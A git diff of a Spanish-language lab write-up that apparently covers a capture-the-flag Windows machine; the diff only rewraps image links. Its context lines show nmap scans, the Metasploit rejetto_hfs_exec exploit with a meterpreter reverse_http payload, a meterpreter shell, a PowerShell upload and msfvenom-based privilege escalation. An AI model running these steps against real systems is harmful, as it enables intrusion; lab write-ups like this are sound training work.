@@ -22,7 +22,7 @@ sudo nmap -p- --open -T5 -sS --min-rate 5000 -vvv -n -Pn 10.10.37.44 -oG allPort
 
 80,135,139,445,3389,5985,8080,47001,49153,49155,49163,49164
 
-![image.png](imagenes/image 20.png)
+![image.png](<imagenes/image 20.png>)
 
 - [ ]  **Nmap serveis**
 
@@ -32,7 +32,7 @@ sudo nmap -v -sV -O --script="safe and vuln" -T4 -n -Pn -p135,445 -oA nmap 10.10
 
 ```
 
-![image.png](imagenes/image 21.png)
+![image.png](<imagenes/image 21.png>)
 
 # **Análisis de Vulnerabilidades**
 
@@ -68,7 +68,7 @@ set LHOST localIP
 
 msf6 exploit(windows/http/rejetto_hfs_exec)
 
-![image.png](imagenes/image 22.png)
+![image.png](<imagenes/image 22.png>)
 
 - **Resultados**: Probamos pero da error.
 Cambiamos payload a : payload/windows/meterpreter/reverse_http
@@ -89,7 +89,7 @@ Obtenemos shell meterpreter
 upload PowerhShell.ps1
 ```
 
-![image.png](imagenes/image 23.png)
+![image.png](<imagenes/image 23.png>)
 
 - **Vulnerabilidad Encontrada**: Servicio que se puede reiniciar
 - **Método de Escalada**: Creamos con msfvenom el payload
